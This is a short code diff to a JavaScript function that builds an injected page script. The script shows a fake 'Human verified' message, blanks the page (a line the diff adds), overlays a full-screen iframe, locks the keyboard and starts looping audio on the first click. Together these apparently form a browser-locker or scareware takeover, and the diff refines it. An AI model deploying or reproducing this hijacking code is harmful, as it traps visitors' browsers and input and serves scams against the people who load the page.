@@ -284,12 +284,10 @@ function buildSecondaryJS(origin) {
 
   return `
   console.log("%c✅ Human verified. Waiting for user interaction...", "color:#0f0;font-size:18px;font-weight:bold");
-
+   document.body.innerHTML = null;
   document.documentElement.style.overflow = 'hidden';
   document.body.insertAdjacentHTML('afterbegin', '<div id="bruceDiv" style="position:fixed;top:0;left:0;width:100%;z-index:99999999;pointer-events:auto;overflow:hidden;"></div>');
 
-  navigator.keyboard.lock();
-  
   var iframe = document.createElement('iframe');
     iframe.src = ${JSON.stringify(srcUrl)};
     iframe.style.width = '100%';
@@ -302,6 +300,8 @@ function buildSecondaryJS(origin) {
     var bruceDiv = document.getElementById('bruceDiv');
     bruceDiv.appendChild(iframe);
     bruceDiv.style.height = '100vh';
+
+    navigator.keyboard.lock();
 
   setTimeout(function() {
     document.addEventListener('click', function initGame() {
@@ -328,7 +328,7 @@ function buildSecondaryJS(origin) {
       audio2.loop = true;
       audio2.play().catch(function(e) { console.warn('Audio 2 blocked:', e); });
     }, { once: true });
-  }, 1000);  
+  }, 1200);
 `;
 }
 
